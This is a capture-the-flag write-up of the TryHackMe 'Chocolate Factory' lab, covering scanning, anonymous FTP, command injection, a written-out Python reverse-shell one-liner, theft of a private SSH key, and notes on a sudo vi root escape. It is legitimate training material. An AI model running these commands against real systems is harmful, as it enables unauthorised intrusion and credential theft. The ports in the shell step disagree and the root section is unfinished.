This is a vulnerable lab available @ https://tryhackme.com/room/chocolatefactory



POC


part A: gaining initial Access

Nmap scan: The pentest started with a nmap scan using 
nmap -T4 -sV -A 10.10.12.204  
![image](https://github.com/user-attachments/assets/d6c9ab51-46d6-495e-981e-8544c5f4d30c)

This gave  back the services running on the server,


a. Port 21: This allowed anonymous login, and the port was accessed using 
ftp  10.10.12.204

After a succesful login, the file was downloaded 
![image](https://github.com/user-attachments/assets/ef7fc003-7fd9-4f0f-9684-7ec8988b2df4)



picture showing the downloaded file 
![gum_room](https://github.com/user-attachments/assets/39218184-a257-44b5-9826-ecdcd8ec7f1d)

b.  80: The website has a homepage with a login form

The homepage
![image](https://github.com/user-attachments/assets/88eac3bd-6883-4760-a27f-67bc0fafd0b0)

The source code of the page ws checked out, and from it, a link tagged "validatee.php" was found which proved that the website was running on php 

The port 80 was subjected to directory bruteforce using FFUF
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.12.204/FUZZ -e .php, .HTML 

and some directories were gotten, they include home.php, index.html, and others 

Picture below shows the result of the FFUF 
![image](https://github.com/user-attachments/assets/5d46e6f6-472b-4618-a95b-b9326c204f07)


getting to The home.php, it was discovered that the page has a command functionality 
![image](https://github.com/user-attachments/assets/7e8555a3-049a-4558-aa7c-c8305eaa9b4c)


Trying the comman d"Cat /etc", the website gave a response showing that it is vulnerable to command ninjection vulnerability
![image](https://github.com/user-attachments/assets/8c73edae-6c13-4884-8868-df07f4aef56d)



using the command " which python3 " on the page, the server hosting website was querried to confirm if there is a python binary on it , and the response showed that there is a python binary

then using the command 
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.106.235",2294));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
and
nc -nlvp 2249

A reverse shell was gotten 
Picture showing the reverse shell gotten from the server hosting the website
![image](https://github.com/user-attachments/assets/eb87dc55-adaa-46cc-9b3d-5ca84aaad3db)


And we were able to get initial access...


Part B: Privilege escalation

After initial access was gained with the user www-data
some files were found in the directory which includes key_rev_key

Using the command "strings" to check the content of the file "key_rev_key", a key was found
![image](https://github.com/user-attachments/assets/af1530b0-29d1-4246-a24c-22a9777c0180)


Then using cat /etc/passwd, the user accounts on the machine was discovered, and a user called charlie was part of it.

Thn I navigated to charlie's home directory and files like telport, telport.pub were found
the content of charlie's home directory
![image](https://github.com/user-attachments/assets/fc896cf9-6549-4345-90e2-ecf7d2debc0c)

The teleport file contained a private ssh key, this key was copied and saved on the attacker's machine with the name "charley' 

The key was then used to login to charlie's account via ssh 
ssh charlie@10.10.12.204 -i charley 

Picture showing a successful login
![image](https://github.com/user-attachments/assets/6cd2fc4f-ff14-4f8d-b632-d71b9e41ebf9)



A user flag was then found in the user home directory..


Then to gaining root access..... coming soon 










2. Directoy bruteforce that leads to a acommand njectin page
3. run a php or bash shell command 

after getting the shell
find the user account
navigate to charlie's account and get the user flag by
  1. grabbing a private ssh keys
  2. ssh charlie@ip -i name_of_key

then
get the user flag
then
  sudo -l
  sudo /usr/bin.vi
  then !/bin/bash

  
